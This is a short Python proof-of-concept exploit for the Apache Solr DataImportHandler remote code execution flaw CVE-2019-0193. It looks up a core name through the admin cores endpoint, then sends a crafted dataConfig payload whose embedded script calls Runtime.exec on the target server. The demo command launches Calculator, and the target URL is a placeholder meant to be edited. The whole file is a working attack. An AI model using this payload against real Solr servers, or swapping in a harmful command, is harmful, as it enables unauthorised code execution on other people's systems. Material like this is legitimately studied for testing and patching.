#coding=utf-8

import requests
import sys

'''
Author: shadowsock5 on 2019/8/11

If "https://stackoverflow.com/feeds" takes too long, replace this url with a RSS source as you see fit.

References: 
https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA
https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py
https://github.com/artsploit/solr-injection/#3-cve-2019-0193-remote-code-execution-via-dataimporthandler
'''

remote = "http://cqq.com:8983"   # Change this to the base url(protocol, hostname and port) you want to exploit.

payload = '''
command=full-import&dataConfig=
<dataConfig>
<dataSource type="URLDataSource"/>
  <script><![CDATA[ java.lang.Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator"); 
  ]]></script>
  <document>
    <entity name="a"
            url="https://stackoverflow.com/feeds"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:" />
  </document>
</dataConfig>
'''


core_url = remote + "/solr/admin/cores"

''' fetch the core name '''
def get_vul_url():
    r = requests.get(core_url, verify=False, allow_redirects=False)
    
    if r.status_code == 200:
    	if r.json()['status'] == "":
    		print("[!] No core availble! Quit!")
    		sys.exit()
    	else:
    		a = list(r.json()['status'].keys())
    		print a[0]
    		p_vul_url = "/solr/" + a[0] + "/dataimport"
    		print("[*] Vulnerable url is: {0}".format(p_vul_url))
    return p_vul_url


vul_url = get_vul_url()
exploit_url = remote + vul_url + "?" + payload

requests.get(exploit_url)
print("[*] Done")
